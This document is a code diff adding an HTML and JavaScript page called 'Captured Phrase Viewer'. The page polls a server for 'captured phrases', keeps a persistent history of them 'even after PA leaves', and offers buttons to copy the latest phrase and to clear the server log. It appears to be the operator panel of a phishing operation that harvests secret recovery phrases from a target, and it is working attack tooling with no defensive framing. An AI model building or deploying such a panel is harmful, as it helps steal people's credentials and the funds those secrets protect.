@@ -1,0 +1,278 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Captured Phrase Viewer</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    background: #0d0e1a;
+    font-family: -apple-system, 'SF Pro Display', 'Helvetica Neue', sans-serif;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    min-height: 100vh;
+    padding: 20px;
+  }
+  .container {
+    background: #1c1d32;
+    border-radius: 20px;
+    padding: 40px;
+    width: 700px;
+    max-width: 100%;
+    box-shadow: 0 20px 60px rgba(0,0,0,0.6);
+  }
+  h1 {
+    color: #fff;
+    font-size: 22px;
+    margin-bottom: 4px;
+  }
+  .subtitle {
+    color: #7b7d9a;
+    font-size: 14px;
+    margin-bottom: 24px;
+  }
+  .status {
+    display: inline-flex;
+    align-items: center;
+    gap: 8px;
+    padding: 8px 16px;
+    border-radius: 20px;
+    font-size: 13px;
+    font-weight: 500;
+    margin-bottom: 20px;
+  }
+  .status.waiting {
+    background: rgba(255, 193, 7, 0.12);
+    color: #ffc107;
+  }
+  .status.captured {
+    background: rgba(76, 217, 100, 0.12);
+    color: #4cd964;
+  }
+  .dot {
+    width: 8px; height: 8px;
+    border-radius: 50%;
+    display: inline-block;
+  }
+  .dot.waiting { background: #ffc107; animation: pulse 1.5s ease-in-out infinite; }
+  .dot.captured { background: #4cd964; }
+  @keyframes pulse {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0.4; }
+  }
+  
+  .latest-box {
+    background: #0d0e1a;
+    border: 1px solid #3772ff;
+    border-radius: 12px;
+    padding: 20px;
+    font-family: 'SFMono-Regular', Consolas, 'Liberation Mono', Menlo, monospace;
+    font-size: 16px;
+    color: #e0e0e0;
+    line-height: 1.7;
+    word-break: break-all;
+    min-height: 80px;
+    user-select: all;
+    margin-bottom: 24px;
+  }
+  .latest-box .empty {
+    color: #5a5c7e;
+    font-style: italic;
+    font-family: -apple-system, 'SF Pro Display', 'Helvetica Neue', sans-serif;
+  }
+  .latest-label {
+    color: #3772ff;
+    font-size: 12px;
+    font-weight: 600;
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+    margin-bottom: 8px;
+  }
+  
+  .history-section h3 {
+    color: #7b7d9a;
+    font-size: 14px;
+    font-weight: 500;
+    margin-bottom: 12px;
+  }
+  .history-entry {
+    display: flex;
+    gap: 12px;
+    padding: 10px 14px;
+    border-radius: 8px;
+    background: #15162a;
+    margin-bottom: 8px;
+    align-items: flex-start;
+  }
+  .entry-time {
+    color: #5a5c7e;
+    font-size: 12px;
+    white-space: nowrap;
+    min-width: 140px;
+    padding-top: 2px;
+  }
+  .entry-phrase {
+    color: #b0b2d3;
+    font-family: 'SFMono-Regular', Consolas, 'Liberation Mono', Menlo, monospace;
+    font-size: 14px;
+    word-break: break-all;
+    line-height: 1.5;
+    flex: 1;
+  }
+  .no-history {
+    color: #5a5c7e;
+    font-style: italic;
+    font-size: 13px;
+  }
+  
+  .btn-group {
+    display: flex;
+    gap: 8px;
+    margin-top: 20px;
+  }
+  .btn {
+    padding: 10px 20px;
+    border: none;
+    border-radius: 8px;
+    font-size: 14px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: all 0.2s;
+  }
+  .btn-refresh {
+    background: #3772ff;
+    color: #fff;
+  }
+  .btn-refresh:hover { background: #2a5ee6; }
+  .btn-copy {
+    background: #262841;
+    color: #b0b2d3;
+    border: 1px solid #2e3058;
+  }
+  .btn-copy:hover { background: #2e3058; color: #fff; }
+  .btn-clear {
+    background: none;
+    color: #ff6b6b;
+    border: 1px solid rgba(255,107,107,0.3);
+    margin-left: auto;
+  }
+  .btn-clear:hover { background: rgba(255,107,107,0.1); }
+  
+  .meta-info {
+    color: #5a5c7e;
+    font-size: 12px;
+    text-align: center;
+    margin-top: 16px;
+  }
+</style>
+</head>
+<body>
+<div class="container">
+  <h1>🔑 Captured Phrase Viewer</h1>
+  <p class="subtitle">Persistent log — you can check anytime, even after PA leaves</p>
+
+  <div class="status waiting" id="statusBadge">
+    <span class="dot waiting" id="statusDot"></span>
+    <span id="statusText">Waiting for PA...</span>
+  </div>
+
+  <div class="latest-label">Latest Captured Phrase</div>
+  <div class="latest-box" id="latestBox">
+    <span class="empty">No phrase captured yet</span>
+  </div>
+
+  <div class="history-section">
+    <h3>📜 Full Capture History</h3>
+    <div id="historyContainer">
+      <span class="no-history">No entries yet</span>
+    </div>
+  </div>
+
+  <div class="btn-group">
+    <button class="btn btn-copy" id="copyBtn">📋 Copy Latest</button>
+    <button class="btn btn-refresh" id="refreshBtn">🔄 Refresh</button>
+    <button class="btn btn-clear" id="clearBtn">🗑️ Clear Log</button>
+  </div>
+
+  <div class="meta-info" id="metaInfo">Last checked: --</div>
+</div>
+
+<script>
+  async function fetchData() {
+    try {
+      // Get latest
+      const [latestRes, logRes] = await Promise.all([
+        fetch('/api/capture'),
+        fetch('/api/log')
+      ]);
+      
+      const latest = await latestRes.json();
+      const log = await logRes.json();
+      
+      // Update latest
+      const latestBox = document.getElementById('latestBox');
+      const statusBadge = document.getElementById('statusBadge');
+      const statusDot = document.getElementById('statusDot');
+      const statusText = document.getElementById('statusText');
+      
+      if (latest.phrase && latest.phrase.trim().length > 0) {
+        latestBox.innerHTML = '';
+        latestBox.textContent = latest.phrase;
+        
+        statusBadge.className = 'status captured';
+        statusDot.className = 'dot captured';
+        statusText.textContent = '✅ Phrase captured!';
+      } else {
+        latestBox.innerHTML = '<span class="empty">No phrase captured yet</span>';
+        statusBadge.className = 'status waiting';
+        statusDot.className = 'dot waiting';
+        statusText.textContent = 'Waiting for PA...';
+      }
+      
+      // Update history
+      const historyContainer = document.getElementById('historyContainer');
+      if (log.entries && log.entries.length > 0) {
+        historyContainer.innerHTML = log.entries.slice().reverse().map(entry => `
+          <div class="history-entry">
+            <span class="entry-time">${new Date(entry.timestamp).toLocaleString()}</span>
+            <span class="entry-phrase">${entry.phrase}</span>
+          </div>
+        `).join('');
+      } else {
+        historyContainer.innerHTML = '<span class="no-history">No entries yet</span>';
+      }
+      
+      document.getElementById('metaInfo').textContent = `Last checked: ${new Date().toLocaleString()}`;
+    } catch (err) {
+      document.getElementById('latestBox').innerHTML = '<span class="empty">Error connecting to server</span>';
+    }
+  }
+
+  document.getElementById('copyBtn').addEventListener('click', () => {
+    const text = document.getElementById('latestBox').textContent;
+    if (!text || text.includes('No phrase')) return;
+    navigator.clipboard.writeText(text).then(() => {
+      const btn = document.getElementById('copyBtn');
+      btn.textContent = '✅ Copied!';
+      setTimeout(() => btn.textContent = '📋 Copy Latest', 2000);
+    });
+  });
+
+  document.getElementById('refreshBtn').addEventListener('click', fetchData);
+  
+  document.getElementById('clearBtn').addEventListener('click', async () => {
+    if (confirm('Clear the log file on the server?')) {
+      await fetch('/api/clear-log', { method: 'POST' });
+      fetchData();
+    }
+  });
+
+  // Auto refresh every 5 seconds
+  setInterval(fetchData, 5000);
+  
+  fetchData();
+</script>
+</body>
+</html>
